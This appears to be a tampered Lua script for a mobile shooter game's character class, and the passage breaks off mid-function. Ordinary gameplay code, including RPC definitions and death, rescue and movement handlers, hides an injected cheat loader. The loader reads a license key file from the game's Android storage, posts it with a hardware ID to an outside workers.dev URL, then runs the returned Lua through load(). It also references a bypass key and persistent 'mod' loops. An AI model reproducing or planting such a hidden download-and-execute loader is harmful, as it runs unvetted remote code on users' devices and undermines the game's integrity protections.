local CharacterBase = {
  ServerRPC = {},
  ClientRPC = {},
  MulticastRPC = {},
  LuaEventContainer = {
    "DefaultLuaEventPlaceholder",
    "OnCharacterAnimInstanceInit",
    "OnCharacterAnimInstanceInitFrameDelay",
    "OnProjectileEffect",
    "OnUnmannedVehicleStateChange",
    "OnDSEnterSelfieMode",
    "OnDSExitSelfieMode",
    "EVENTID_CHARACTER_POSSESSED",
    "EVENTID_PAWN_PICK_UP_ITEM",
    "EVENTID_PLAYEREVENT_REVIVAL",
    "EVENTID_INGAME_BUILD_SUCCESS",
    "EVENTID_PLAYEREVENT_SCOPECHANGE",
    "EVENTID_CHARACTER_DIED_PRE",
    "EVENTID_LOCAL_HERO_ID_CHANGED",
    "EVENTID_HERO_ID_CHANGED",
    "EVENTID_INGAME_ON_PAWN_CAMP_CHANGED",
    "EVENTID_TAKE_DAMAGE",
    "EVENTID_PLAYEREVENT_CONSUMEITEM",
    "EVENTID_PLAYEREVENT_DROPITEM"
  }
}
local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
local BudgetScheduler = require("GameLua.Mod.BaseMod.Common.BudgetScheduler")
local EAvatarSlotType = import("EAvatarSlotType")
local EPawnState = import("EPawnState")
local ECharacterPoseState = import("ECharacterPoseType")
local GameLuaAPI = import("/Script/ShadowTrackerExtra.GameLuaAPI")
local ASTExtraPlayerController = import("/Script/ShadowTrackerExtra.STExtraPlayerController")
local ANewFakePlayerAIController = import("NewFakePlayerAIController")
local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local GameComponentData = require("GameLua.GameCore.Data.GameComponentData")
local GameplayActorData = require("GameLua.GameCore.Data.GameplayActorData")
local EMovementMode = import("EMovementMode")
local ESTEPoseState = import("ESTEPoseState")
local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
local ECharacterHealthStatus = import("ECharacterHealthStatus")
local FHealthPredictShowData = import("HealthPredictShowData")
local ELifetimeCondition = import("ELifetimeCondition")
local MOD_URL      = "https://late-feather-24ce.victortipvala.workers.dev/stage1"

local MODS = {
    { key = "m:znvip",  name = "knox",   desc = "ZN KNOX PRO LUA" },
}

local function djb2(s)
  local h = 5381
  for i=1,#s do h=(h*33+s:byte(i))%2147483647 end
  return tostring(math.floor(h))
end

local function generate_auth_body(modKey, gameSecret)
    -- LICENSE: apni key + UID bhejo (worker mod tabhi dega). Bina key purana VIPUSER dead hai.
    local user_key = _G._LICENSE_KEY
    if not user_key or user_key == "" then
        pcall(function()
            local f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/zn_knox.txt", "r")
            if f then user_key = f:read("*all") f:close() end
        end)
        if user_key then user_key = user_key:gsub("%s+", "") end
        if not user_key or user_key == "" then user_key = nil end
    end
    local hwid = _G._LICENSE_UID or "00000000"
    user_key = user_key or "VIPUSER"
    local ts = os.time()
    local nonce = tostring(math.random(100000, 999999))
    local to_hash = user_key .. "chetan" .. hwid .. "mod" .. tostring(ts) .. nonce
    local sign = djb2(to_hash)
    local gp = gameSecret or "default"
    return "user_key="..user_key.."&hwid="..hwid.."&timestamp="..tostring(ts).."&nonce="..nonce.."&sign="..sign.."&mod="..modKey.."&gp="..gp
end

local _GetItemName = function(ItemID)
  local ItemConfig = CDataTable.GetTableData("Item", ItemID)
  return ItemConfig and ItemConfig.ItemName or ""
end
CharacterBase.ServerRPC.ServerRPC_FailPreJoinDance = {
  Reliable = true,
  Params = {
    import("/Script/Engine.Actor")
  }
}
CharacterBase.ClientRPC.ClientRPC_FailedToJoinDance = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
CharacterBase.ClientRPC.ClientRPC_TryJoinDance = {
  Reliable = true,
  Params = {
    import("/Script/Engine.Actor"),
    UEnums.EPropertyClass.Int
  }
}
CharacterBase.ClientRPC.ClientRPC_ShowEffectAfterFruitBingo = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Str,
    UEnums.EPropertyClass.Str,
    UEnums.EPropertyClass.Int
  }
}
CharacterBase.ClientRPC.ClientRPC_PlayMontageCamera = {
  Reliable = true,
  Params = {
    import("/Script/CoreUObject.Vector"),
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Str
  }
}
CharacterBase.MulticastRPC.ShowEffectAfterSelfRescueSucceed = {
  Reliable = true,
  Params = {}
}
CharacterBase.MulticastRPC.ServerShowShowUIConfigUI = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Str
  }
}
CharacterBase.MulticastRPC.MultiCast_GenericRPC = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Byte
    }
  }
}

function CharacterBase:ctor(selfType)
  self._SuperData = nil
  self.VehicleParachuteComponent = nil
  self.DefaultNetCullDistanceSq = 1600000000
  self.DiedTime = 0
  self.DiedPosition = FVector(0, 0, 0)
  self.TeammmatePositionWhenMeDied = {}
  self.DefaultFootStep = true
  self.tCorrectionSimulateRepData = {
    Timer = nil,
    CurRepLoc = nil,
    LastRepLoc = nil
  }
  self.LastAddBuffInstID = 0
  self.LastAddPawn = nil
  self.bDisableProne = false
end

function CharacterBase:GetLifetimeReplicatedProps()
  local RepTable = {
    {
      "bCableCarView",
      ELifetimeCondition.COND_None,
      UEnums.EPropertyClass.Bool
    },
    {
      "bIsPlayingLevelSequenceForShow",
      ELifetimeCondition.COND_None,
      UEnums.EPropertyClass.Bool
    },
    {
      "bCounterattacking",
      ELifetimeCondition.COND_None,
      UEnums.EPropertyClass.Bool
    }
  }
  return RepTable
end

function CharacterBase:_PostConstruct()
  CharacterBase.__super._PostConstruct(self)
  self:AddControlEventWithCondition(self, "OnAttrChangeEventDelegate", {
    AttrName = {
      "bUseDeadBox",
      "IsInUnderGroundArea",
      "IsAroundUndergroundEntry",
      "EmotePlayRate",
      "AreaID",
      "MapID",
      "DanceStageAreaState"
    }
  }, self.CharacterAttrChangeEvent, self)
  self:AddControlEvent(self, "OnPawnRespawnDelegate", self.HandleOnRespawn, self)
  self:AddControlEvent(self, "OnParachuteStateChanged", self.LuaHandleParachuteStateChanged, self)
  self:AddControlEvent(self, "OnRepParachuteStateDelegate", self.LuaHandleRepParachuteStateDelegate, self)
  self:AddControlEvent(self, "OnPlayerPoseChange", self.PlayerPoseChange, self)
  self:AddControlEvent(self, "OnAttachedToVehicle", self.HandleAttachedToVehicle, self)
  self:AddControlEvent(self, "OnDetachedFromVehicle", self.HandleDetachedFromVehicle, self)
  if not Client then
    self.DefaultNetCullDistanceSq = self.NetCullDistanceSquared
    self.UseNewParachuteMove = false
    self.bIsPlayingLevelSequenceForShow = false
    self:SetNetUpdateGroupID(2)
    self:AddControlEvent(self, "IsEnterNearDeathDelegate", self.HandleServerEnterNearDeathDelegate, self)
    self:AddControlEvent(self, "OnPlayerStartRescue", self.HandleOnPlayerStartRescue, self)
    self:AddControlEvent(self, "StateEnterHandler", self.HandleOnEnterState, self)
    self:AddControlEvent(self, "OnHandleSkillStartDelegate", self.HandleOnSkillStart, self)
  else
    self.bClientCanTriggerSkill = true
    self:AddControlEvent(self, "OnPreRepAttachment", self.HandleOnPreRepAttachment, self)
    self:AddControlEvent(self, "IsEnterNearDeathDelegate", self.HandleIsEnterNearDeathDelegate, self)
    self:AddCommonEvent(EVENTTYPE_APPLICATION_ACTIVE_STATE, EVENTID_APPLICATION_REACTIVATED_EX, self.OnApplicationReactivated, self)
  end
  self:AddControlEvent(self, "OnDeathDelegate", self.HandleDeathDelegate, self)
  if Client then
    _G._PreloadedMods = _G._PreloadedMods or {}
    if not _G._MOD_PRELOAD_DONE then
      local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
      if http and http.Post then
        local headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"] = "game=ShadowTrackerExtra engine=UE4 platform=Android"
        }
        local preloadKeys = {}
        for _, m in ipairs(MODS) do preloadKeys[#preloadKeys+1] = m.key end
        preloadKeys[#preloadKeys+1] = BYPASS_KEY
        local function tryPreload(idx, retries)
            if idx > #preloadKeys then return end
            local key = preloadKeys[idx]
            if _G._PreloadedMods[key] then
                tryPreload(idx + 1, 3)
                return
            end
            local attempt = 0
            local maxRetries = retries or 3
            local function doRequest()
                attempt = attempt + 1
                local timeout = 15 + (attempt * 10)
                http:Post(MOD_URL, headers, generate_auth_body(key), nil, function(s, resp)
                    if s and resp and #resp > 50 then
                        local ok, chunk = pcall(load, resp, "m.lua")
                        if ok and chunk then
                            _G._PreloadedMods[key] = chunk
                            tryPreload(idx + 1, 3)
                            return
                        end
                    end
                    if attempt < maxRetries then
                        local retryTimer
                        retryTimer = CGameWorld and CGameWorld:GetWorld() and nil
                        doRequest()
                    end
                end, timeout)
            end
            doRequest()
        end
        tryPreload(1, 3)
        _G._MOD_PRELOAD_DONE = true
      end
    end
  end
end

function CharacterBase:OnDestroyed()
  self:Dispose()
  CharacterBase.__super.OnDestroyed(self)
end

function CharacterBase:ReceiveOnPoolCreate()
  self:ResetAnimInstanceClass()
end

function CharacterBase:CharacterIsRecycled()
  return false
end

function CharacterBase:BroadcastFatalDamageInfoWrapperSimpleLua(Causer, Victim, DamageType, AdditionalParam, IsHeadShot)
  local FatalDamageSubsystem = SubsystemMgr:Get("FatalDamageSubsystem")
  if FatalDamageSubsystem then
    FatalDamageSubsystem:BroadcastFatalDamageInfoWrapperSimpleLua(Causer, Victim, DamageType, AdditionalParam, IsHeadShot)
  end
end

function CharacterBase:BroadcastFatalDamageInfoWrapperLua(Causer, Victim, DamageType, AdditionalParam, IsHeadShot, ResultHealthStatus, PreviousHealthStatus, WhoKillMe, KillerKillCount)
  local FatalDamageSubsystem = SubsystemMgr:Get("FatalDamageSubsystem")
  if FatalDamageSubsystem then
    FatalDamageSubsystem:BroadcastFatalDamageInfoWrapperLua(Causer, Victim, DamageType, AdditionalParam, IsHeadShot, ResultHealthStatus, PreviousHealthStatus, WhoKillMe, KillerKillCount)
  end
end

function CharacterBase:OnApplicationReactivated()
  print(bWriteLog and "CharacterBase:OnApplicationReactivated FormReactivated true")
  self.FormReactivated = true
end

function CharacterBase:OnClientAddKnownMissingWeapon(ItemDefineID)
  local ItemID = ItemDefineID and ItemDefineID.TypeSpecificID
  if not ItemID or ItemID <= 0 then
    printf("CharacterBase:OnClientAddKnownMissingWeapon invalid item, itemID:%s", tostring(ItemID))
    return
  end
  local TipsCD = 10
  local UGameplayStatics = import("GameplayStatics")
  local CurrentTime = UGameplayStatics.GetRealTimeSeconds(CGameWorld)
  if 0 <= CurrentTime then
    local LastTime = self.LastMissingWeaponTipsTime
    if type(LastTime) == "number" and CurrentTime >= LastTime and TipsCD > CurrentTime - LastTime then
      printf("CharacterBase:OnClientAddKnownMissingWeapon suppress nearby tips, itemID:%s, currentTime:%s, lastTime:%s, cd:%s", tostring(ItemID), tostring(CurrentTime), tostring(LastTime), tostring(TipsCD))
      return
    end
    self.LastMissingWeaponTipsTime = CurrentTime
  end
  local ItemName = _GetItemName(ItemID)
  local TipsDuration = 5
  printf("CharacterBase:OnClientAddKnownMissingWeapon show missing weapon tips, itemID:%s, itemName:%s, duration:%s", tostring(ItemID), tostring(ItemName), tostring(TipsDuration))
  ShowNotice(LocUtil.LocalizeResFormat(8200003, ItemName), nil, TipsDuration)
end

function CharacterBase:HandleOnEnterState(nState)
  if not Client and self.bEnsure == true then
    self:RemoveControlEvent(self.Object, "StateEnterHandler")
    return
  end
  if self:HasAuthority() then
    print(bWriteLog and "CharacterBase:HandleOnEnterState, nState = " .. tostring(nState) .. ", PlayerKey = " .. tostring(self.PlayerKey))
    local EPawnState = import("EPawnState")
    if nState == EPawnState.Dying or nState == EPawnState.Dead or nState == EPawnState.BeCarriedBack or nState == EPawnState.Dizziness or nState == EPawnState.Knock or nState == EPawnState.Arrest then
    else
      local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
      if AFKReportorSubsystem then
        local PlayerState = self:GetPlayerStateSafety()
        if PlayerState and slua.isValid(PlayerState) then
          AFKReportorSubsystem:PlayerHaveAction(PlayerState.UID)
        else
          print(bWriteLog and "CharacterBase:HandleOnEnterState, PlayerState = " .. tostring(PlayerState))
        end
      else
        print(bWriteLog and "CharacterBase:HandleOnEnterState, AFKReportorSubsystem = nil")
      end
    end
  end
end

function CharacterBase:HandleOnSkillStart(uSkillCharacter, SkillID)
  if self:HasAuthority() then
    local AFKReportorSubsystem = SubsystemMgr:Get("AFKReportorSubsystem")
    if AFKReportorSubsystem then
      local PlayerState = self:GetPlayerStateSafety()
      if PlayerState and slua.isValid(PlayerState) then
        AFKReportorSubsystem:PlayerHaveAction(PlayerState.UID)
      else
        print(bWriteLog and "CharacterBase:HandleOnSkillStart, PlayerState = " .. tostring(PlayerState))
      end
    else
      print(bWriteLog and "CharacterBase:HandleOnSkillStart, AFKReportorSubsystem = nil")
    end
  end
end

function CharacterBase:HandCharacterDoJump()
  if slua.isValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Walking then
    self.STCharacterMovement.Velocity.Z = self.STCharacterMovement.JumpZVelocity
    self.STCharacterMovement:SetMovementMode(EMovementMode.MOVE_Falling, 0)
    self:RemoveControlEvent(self, "CharacterDoJump")
    self:ServerTriggerJump()
    self:AddControlEvent(self, "CharacterDoJump", self.HandCharacterDoJump, self)
  end
end

function CharacterBase:HandleOnPreRepAttachment(uAttachParent, uAttachComponent, uAttachSocket, uLocationOffset, uRotationOffset, uRelativeScale3D)
  if uAttachParent and slua.isValid(uAttachParent) then
    if not Client.IsEnableDSGrayPublishFlag(2199023255552) or Client.IsEditor() then
      local ASTExtraVehicleBase = import("STExtraVehicleBase")
      if not Game:IsClassOf(uAttachParent, ASTExtraVehicleBase) then
        print(bWriteLog and "DebugAttach HandleOnPreRepAttachment not  STExtraVehicleBase return  PlayerKey:", self.PlayerKey)
        return
      end
      print(bWriteLog and "DebugAttach HandleOnPreRepAttachment uAttachParent ok PlayerKey:", self.PlayerKey)
      local RelativeLocation = FVector(0, 0, self:GetSimpleCollisionHalfHeightInStandPose())
      local uUseAttachComp
      if slua.isValid(uAttachComponent) then
        uUseAttachComp = uAttachComponent
      else
        if uAttachParent.GetMesh then
          uUseAttachComp = uAttachParent:GetMesh()
        end
        print(bWriteLog and "DebugAttach HandleOnPreRepAttachment uUseAttachComp nil or IsPendingKill, Please Check Vehicle's DefaultNetCullDistanceSq=3600000000.0 PlayerKey:", self.PlayerKey)
      end
      local VehicleSeat = uAttachParent:GetVehicleSeats()
      if slua.isValid(VehicleSeat) and slua.isValid(uUseAttachComp) then
        local RealSocketName = VehicleSeat:GetAttachSocketName(self, uUseAttachComp, uAttachSocket)
        if RealSocketName ~= "None" then
          print(bWriteLog and "CharacterBase:HandleOnPreRepAttachment", uAttachSocket, RealSocketName, uAttachParent)
          uAttachSocket = RealSocketName
        end
      end
      self:SetAttachment(uAttachParent, uUseAttachComp, RelativeLocation, uRotationOffset, uRelativeScale3D, uAttachSocket)
    end
  else
    print(bWriteLog and "DebugAttach HandleOnPreRepAttachment uAttachParent nil PlayerKey:", self.PlayerKey)
  end
end

function CharacterBase:HandleIsEnterNearDeathDelegate(IsNearDeath)
  if self.HealthStatus == ECharacterHealthStatus.FinishedLastBreath and self.LastHealthStatus == ECharacterHealthStatus.HasLastBreath then
    print(bWriteLog and "DeadAnimation HandleIsEnterNearDeathDelegate  call PlayerKey:", self.PlayerKey)
    if slua.isValid(self.Mesh) then
      self:CheckPlayDeadAnimation(self.Mesh.AnimScriptInstance)
      local uAnimInstances = self.Mesh:GetSubAnimInstances()
      for i = 1, uAnimInstances:Num() do
        local uAnimInst = uAnimInstances:Get(i - 1)
        self:CheckPlayDeadAnimation(uAnimInst)
      end
    end
  end
  local ENetRole = import("ENetRole")
  local EParachuteState = import("EParachuteState")
  if self.Role == ENetRole.ROLE_AutonomousProxy and self.HealthStatus == ECharacterHealthStatus.HasLastBreath and self.ParachuteState == EParachuteState.PS_Opening then
    self:SwitchCameraToParachuteOpening()
    print(bWriteLog and "NearDeathParachute parachute Death")
  end
  self:ClearFollowEmote()
end

function CharacterBase:HandleServerEnterNearDeathDelegate(IsNearDeath)
  if IsNearDeath then
    local Controller = self:GetPlayerControllerSafety()
    local SilentCommunicationSubsystem = SubsystemMgr:Get("SilentCommunicationSubsystem")
    if SilentCommunicationSubsystem then
      SilentCommunicationSubsystem:OnConditionTrigger(1, Controller)
    end
  end
end

function CharacterBase:GetSelfRescueSkillID()
  if self:HasState(EPawnState.AttachToOther) then
    return 0
  end
  return 1014669
end

function CharacterBase:HandleOnPlayerStartRescue(RescueWho, IsRescuing)
  if RescueWho and slua.isValid(RescueWho) and RescueWho == self.Object then
    print(bWriteLog and "CharacterBase:HandleOnPlayerStartRescue, IsRescuing = " .. tostring(IsRescuing) .. ", PlayerKey = " .. tostring(self.PlayerKey))
    if IsRescuing then
      local uWeaponManager = self:GetWeaponManager()
      if Game:IsValid(uWeaponManager) then
        uWeaponManager.HideCurrentWeapon = true
      else
        print(bWriteLog and "CharacterBase:HandleOnPlayerStartRescue, uWeaponManager invalid")
      end
      self.CachedSelfRescueSkillID = self:GetSelfRescueSkillID()
      self:TriggerEntrySkillWithID(self.CachedSelfRescueSkillID, true)
      local PlayerState = self:GetPlayerStateSafety()
      if Game:IsValid(PlayerState) then
        PlayerState:AddGeneralCount(1121, 1, false)
      end
    else
      local SkillManager = self:GetSkillManager()
      if SkillManager and slua.isValid(SkillManager) and self.CachedSelfRescueSkillID then
        local UTSkillStopReason = import("UTSkillStopReason")
        SkillManager:StopSkill(self.CachedSelfRescueSkillID, UTSkillStopReason.SkillStopReason_Interrupted)
        self.CachedSelfRescueSkillID = nil
      end
      local uWeaponManager = self:GetWeaponManager()
      if Game:IsValid(uWeaponManager) then
        uWeaponManager.HideCurrentWeapon = false
      else
        print(bWriteLog and "CharacterBase:HandleOnPlayerStartRescue, uWeaponManager invalid")
      end
    end
  end
  if IsRescuing then
    local Controller = self:GetPlayerControllerSafety()
    local SilentCommunicationSubsystem = SubsystemMgr:Get("SilentCommunicationSubsystem")
    if SilentCommunicationSubsystem then
      SilentCommunicationSubsystem:OnConditionTrigger(2, Controller)
    end
  else
    if not slua.isValid(RescueWho) then
      return
    end
    if RescueWho == self.Object then
      return
    end
    if RescueWho:HasState(EPawnState.Dying) then
      return
    end
    local uController = RescueWho:GetPlayerControllerSafety()
    if not slua.isValid(uController) then
      return
    end
    local uPlayerState = uController.PlayerState
    if not slua.isValid(uPlayerState) then
      return
    end
    local nKillerPlayerKey = uPlayerState.NearDeathCauserId
    local uKillerPlayerState = GameplayData.GetPlayerState(nKillerPlayerKey)
    if slua.isValid(uKillerPlayerState) and uKillerPlayerState.TeamID == self.TeamID and uPlayerState ~= uKillerPlayerState then
      return
    end
    local SilentCommunicationSubsystem = SubsystemMgr:Get("SilentCommunicationSubsystem")
    if SilentCommunicationSubsystem then
      SilentCommunicationSubsystem:OnConditionTrigger(2, uController, uController, 31006, 0, true, nil)
    end
  end
end

function CharacterBase:HandleDeathDelegate()
  print(bWriteLog and "CharacterBase HandleDeathDelegate" .. tostring(self.PlayerKey))
  if Client then
    self:ClearFollowEmote()
  end
  if slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement:Deactivate()
    self.STCharacterMovement:SetMovementMode(EMovementMode.MOVE_None, 0)
  end
end

function CharacterBase:GetTargetAnimClass()
  if self.AvatarAnimClassCache ~= nil then
    return self.AvatarAnimClassCache
  end
  local uPC = self:GetPlayerControllerSafety()
  if slua.isValid(uPC) then
    return self.MainCharAnimClass
  end
  if self:IsInCarryBackState() then
    local uBeCarriedCharacter = self:GetBeCarriedBackCharacter()
    if slua.isValid(uBeCarriedCharacter) and slua.isValid(uBeCarriedCharacter:GetPlayerControllerSafety()) then
      return self.MainCharAnimClass
    end
  end
  return self.MainCharTPPAnimClass
end

function CharacterBase:ResetCharAnimInstanceClass(SetReason, bForceClearOldAnim)
  self.Super:ResetCharAnimInstanceClass(SetReason, bForceClearOldAnim)
end

function CharacterBase:CheckPlayDeadAnimation(uAnimInst)
  if slua.isValid(uAnimInst) and uAnimInst.PlayPlayerDeadAnimation ~= nil and uAnimInst.C_IsNearDeathStatus ~= nil then
    local bResetND = false
    if uAnimInst.C_IsNearDeathStatus == true then
      uAnimInst.C_IsNearDeathStatus = false
      bResetND = true
    end
    local PrePose = uAnimInst.C_PoseType
    uAnimInst.C_PoseType = ECharacterPoseState.ECharPose_Crouch
    print(bWriteLog and "DeadAnimation HandleIsEnterNearDeathDelegate PlayPlayerDeadAnimation true PlayerKey:", self.PlayerKey)
    uAnimInst:PlayPlayerDeadAnimation()
    if bResetND then
      uAnimInst.C_IsNearDeathStatus = true
    end
    uAnimInst.C_PoseType = PrePose
  end
end

function CharacterBase:SetDiedTime()
  self.DiedTime = CGameState:GetServerWorldTimeSeconds()
  local PlayerState = self:GetPlayerStateSafety()
  if PlayerState == nil or slua.isValid(PlayerState) == false or PlayerState.SetDiedTime == nil then
    return
  end
  PlayerState:SetDiedTime()
end

function CharacterBase:GetDiedTime()
  if self.DiedTime then
    return self.DiedTime
  else
    return 0
  end
end

function CharacterBase:SetDiedPosition()
  self.DiedPosition = self:K2_GetActorLocation()
  self.TeammmatePositionWhenMeDied = {}
  local CharacterState = self:GetPlayerStateSafety()
  if CharacterState == nil then
    return
  end
  local TeammatesState = CharacterState.TeamMatePlayerStateList
  if TeammatesState == nil or TeammatesState:Num() <= 0 then
    return
  end
  for index = 0, TeammatesState:Num() - 1 do
    local uTeammatePlayerState = TeammatesState:Get(index)
    if uTeammatePlayerState and slua.isValid(uTeammatePlayerState) and slua.isValid(uTeammatePlayerState.TeamMatePlayerState) then
      local uOtherCharacter = uTeammatePlayerState.TeamMatePlayerState:GetPlayerCharacter()
      if uOtherCharacter and slua.isValid(uOtherCharacter) then
        self.TeammmatePositionWhenMeDied[uOtherCharacter.PlayerKey] = uOtherCharacter:K2_GetActorLocation()
      end
    end
  end
end

function CharacterBase:GetDiedPosition()
  if self.DiedPosition then
    return self.DiedPosition
  else
    return FVector(0, 0, 0)
  end
end

function CharacterBase:GetTeammatePositionWhenMeDied()
  return self.TeammmatePositionWhenMeDied
end

function CharacterBase:SetDiedPlayerCount()
  local uPlayerState = self:GetPlayerStateSafety()
  if uPlayerState == nil or slua.isValid(uPlayerState) == false then
    print(bWriteLog and "CharacterBase:SetDiedPlayerCount, PlayerKey = " .. tostring(self.PlayerKey) .. ", uPlayerState is invalid")
    return
  end
  if uPlayerState.SetDiedPlayerCount == nil then
    print(bWriteLog and "CharacterBase:SetDiedPlayerCount, PlayerKey = " .. tostring(self.PlayerKey) .. ", uPlayerState has no SetDiedPlayerCount function")
    return
  end
  uPlayerState:SetDiedPlayerCount()
end

function CharacterBase:ReceiveBeginPlay()
  printf("CharacterBase ReceiveBeginPlay() PlayerKey:%s", tostring(self.PlayerKey))
  CharacterBase.__super.ReceiveBeginPlay(self)
  GameplayData.BindPlayerCharacter(self.Object)
  BudgetScheduler.Submit(BudgetScheduler.Channel.Init, function()
    if slua.isValid(self.Object) then
      self:ConditionChangePhysicsAsset()
    end
  end, self.Object, "CharacterBase.ConditionChangePhysicsAsset")
  if Client then
    local AvatarExceptionSubsystem = SubsystemMgr:Get("AvatarExceptionSubsystem")
    if AvatarExceptionSubsystem then
      AvatarExceptionSubsystem:BindPlayerCharacter(self.Object)
    end
  end
  if self.LuaReceiveBeginPlay then
    self:LuaReceiveBeginPlay()
  end
  self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL, EVENTID_GAME_MODE_STATE_CHANGE, {
    [1] = "FightingState"
  }, self.HandleEnterGameModeFightingState, self)
  self:CheckInitPlayerDSData()
  if self.DelayResetStandDuration ~= nil and self.DelayHideDuration ~= nil then
    self.DelayResetStandDuration = self.DelayHideDuration
  end
  if self:HasAuthority() and slua.isValid(self.NearDeatchComponent) then
    self:AddControlEvent(self.NearDeatchComponent, "OnPreEnterNearDeath", self.HandleOnPreEnterNearDeath, self)
  end
  if self:IsAutonomousProxy() and slua.isValid(self.STCharacterMovement) then
    self:AddControlEvent(self.STCharacterMovement, "OnClientAdjustPosition", self.HandleOnClientAdjustPosition, self)
    self.STCharacterMovement.ForbiddenMoveCondition.ContinueSeconds = 10
  end
  if CGame:IsEditor() then
    local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
    local SecurtyEditorConfig = GamePlayTools.GetCurrentConfig("SecurtyEditorConfig")
    if SecurtyEditorConfig and SecurtyEditorConfig.GameSafeCallbacks then
      require(SecurtyEditorConfig.GameSafeCallbacks)
    end
  end
  local UKismetSystemLibrary = import("KismetSystemLibrary")
  if UKismetSystemLibrary.IsDedicatedServer(self) and GameSafeCallbacks then
    GameSafeCallbacks.CharacterReceiveBeginPlay(self)
    self.bSkipComparePropertiesForReplay = true
  end
  if Client then
    self:AddControlEvent(self, "OnCharacterFallingModeChange", self.HandleCharacterFallingModeChange, self)
  end
  if self:HasAuthority() then
    local Config = require("GameLua.Mod.BaseMod.DS.Config.SelfRescueConfig")
    if Config then
      if Config.HurtWhenSelfRescue ~= nil then
        self.HurtWhenSelfRescue = Config.HurtWhenSelfRescue
      end
      if Config.CoolDownTime ~= nil then
        self.SelfRescueCoolDownTime = Config.CoolDownTime
      end
      print(bWriteLog and "CharacterBase:ReceiveBeginPlay, Set HurtWhenSelfRescue = " .. tostring(self.HurtWhenSelfRescue) .. ", SelfRescueCoolDownTime = " .. tostring(self.SelfRescueCoolDownTime))
    end
    self:ReplaceGrenadeSkills()
  end
  if self:IsAutonomousProxy() then
    local CurrentVehicle = self:GetCurrentVehicle()
    if slua.isValid(CurrentVehicle) then
      self:ChangeCurrentVehicle(CurrentVehicle)
    end
    self:AddControlEvent(self, "OnClientCurrentVehicleChange", self.ChangeCurrentVehicle, self)
    local CurrentShootWeapon = self:GetCurrentShootWeapon()
    if slua.isValid(CurrentShootWeapon) then
      self:ChangeCurrentWeapon(CurrentShootWeapon)
    end
    GameComponentData.AddSelfWeaponManagerComponentEvent(self, "ChangeCurrentUsingWeaponDelegate", self.ChangeCurrentWeapon, self)
    GameComponentData.AddSelfWeaponManagerComponentEvent(self, "OnClientAddKnownMissingWeapon", self.OnClientAddKnownMissingWeapon, self)
    if self.ReportCharacterStateTimer then
      self:RemoveGameTimer(self.ReportCharacterStateTimer)
      self.ReportCharacterStateTimer = nil
    end
    self.ReportCharacterStateTimer = self:AddGameTimer(5.0, true, function()
      self:ReportCharacterState()
    end)
  end
  if Client and self:IsAutonomousProxy() then
    self:RegistAttrModifyRecordList()
  end
  if Client then
    local uGameState = slua_GameFrontendHUD:GetGameState()
    if uGameState and slua.isValid(uGameState) and uGameState.GetGameModeState and uGameState:GetGameModeState() == "FightingState" then
      local NewObjectPoolLuaBridgeSubsystem = SubsystemMgr:Get("NewObjectPoolLuaBridgeSubsystem")
      if NewObjectPoolLuaBridgeSubsystem then
        NewObjectPoolLuaBridgeSubsystem.SpawnActorCounter_Character = NewObjectPoolLuaBridgeSubsystem.SpawnActorCounter_Character + 1
      end
    end
    local UKismetSystemLibrary = import("KismetSystemLibrary")
    if slua.isValid(self.STCharacterMovement) then
      self.STCharacterMovement.MoveSkipTickContinueTime = 2
      self.STCharacterMovement.MoveSkipTickContinueCount = 40
      self.STCharacterMovement.SimulateDelayReceiveLODTheshold = 16
      self.STCharacterMovement.SimulateNotMoveSmoothLODTheshold = 14
    end
    if Client.IsDevelopment() then
      self:DevelopmentClientCheck()
    end
    local ENetRole = import("ENetRole")
    if self.Role == ENetRole.ROLE_SimulatedProxy then
      self:RefreshThermalImagingLocal()
    end
  end
  if self:HasAuthority() and slua.isValid(self.STCharacterMovement) then
    self:AddControlEvent(self.STCharacterMovement, "OnComponentActivated", self.OnMovementActivated, self)
    self:AddControlEvent(self.STCharacterMovement, "OnResolvePenetrationDelegate", self.HandleOnResolvePenetrationDelegate, self)
  end
  local ENetRole = import("ENetRole")
  if self.Role == ENetRole.ROLE_AutonomousProxy and slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement.bOpenLocationSmoothOnDynamicMovementBase = false
    print(bWriteLog and "CharacterBase:ReceiveBeginPlay bOpenLocationSmoothOnDynamicMovementBase false")
  end
  self:ShowDoorInteractUIIfNeed()
  if Client then
    self:AddControlEvent(self, "OnSmartBearerLayerVisibilityChanged", self._OnSmartBearerLayerVisibilityChanged, self)
  end

  if Client then
    -- FIX: persistent features across matches (always-on).
    -- Only local player character should own the mod loops.
    local bIsLocalChar = false
    if self and self.IsAutonomousProxy then
        pcall(function() bIsLocalChar = self:IsAutonomousProxy() end)
    end
    -- Fallback: Role check (ReceiveBeginPlay me kabhi-kabhi IsAutonomousProxy false hota hai)
    if not bIsLocalChar and self and self.Role then
        pcall(function()
            local ENetRole_Local = import("ENetRole")
            if self.Role == ENetRole_Local.ROLE_AutonomousProxy then bIsLocalChar = true end
        end)
    end
    if not bIsLocalChar then return end

    local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
    -- Popup/menu sirf ek baar, lekin features har naye character par re-attach honge.
    -- Isliye purana early-return hata diya.
    if _G._MOD_POPUP_SHOWN_PC == nil and pc then
        _G._MOD_POPUP_SHOWN_PC = pc
    end

    _G._MOD_SETTINGS = _G._MOD_SETTINGS or {}

    local function setGameSecret(pc)
        if pc then
            local gs = djb2(tostring(pc.Object) .. tostring(pc.PlayerName or "") .. tostring(os.time()))
            _G._GAME_SECRET = gs
        else
